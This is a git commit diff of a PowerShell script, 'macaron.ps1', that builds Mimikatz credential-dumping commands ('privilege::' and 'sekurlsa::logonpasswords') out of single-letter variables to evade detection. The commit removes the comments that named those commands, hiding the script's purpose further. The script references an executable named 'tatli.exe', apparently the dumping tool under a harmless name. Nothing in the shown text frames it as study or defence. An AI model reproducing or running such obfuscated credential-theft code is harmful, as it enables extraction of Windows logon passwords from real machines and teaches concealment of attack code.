3710df3da7ff73425928847473f9a34ce3484481
Fatih Burak Toprak <fatihburaktoprak@gmail.com>
2025-04-15 15:47:43 +0300

    Update macaron.ps1

--- macaron.ps1
+++ macaron.ps1
@@ -38,13 +38,13 @@ if (-not (Test-Path "C:\eren\macaron\tatli.exe")) {
 }
 
 $a = "p"; $b = "r"; $c = "i"; $d = "v"; $e = "i"; $f = "l"; $g = "e"
-$cmd1 = "$a$b$c$d$e$f$g" + "::"  # privilege::
+$cmd1 = "$a$b$c$d$e$f$g" + "::"
 
 $h = "s"; $i = "e"; $j = "k"; $k1 = "u"; $l1 = "r"; $m1 = "l"; $n1 = "s"; $o1 = "a"
-$mod = "$h$i$j$k1$l1$m1$n1$o1"   # sekurlsa
+$mod = "$h$i$j$k1$l1$m1$n1$o1" 
 
 $p1 = "l"; $p2 = "o"; $p3 = "g"; $p4 = "o"; $p5 = "n"; $p6 = "p"; $p7 = "a"; $p8 = "s"; $p9 = "s"; $p10 = "w"; $p11 = "o"; $p12 = "r"; $p13 = "d"; $p14 = "s"
-$cmd2 = "$mod" + "::" + "$p1$p2$p3$p4$p5$p6$p7$p8$p9$p10$p11$p12$p13$p14"  # sekurlsa::logonpasswords
+$cmd2 = "$mod" + "::" + "$p1$p2$p3$p4$p5$p6$p7$p8$p9$p10$p11$p12$p13$p14"
 
 $cmd3 = "ex" + "it"
 
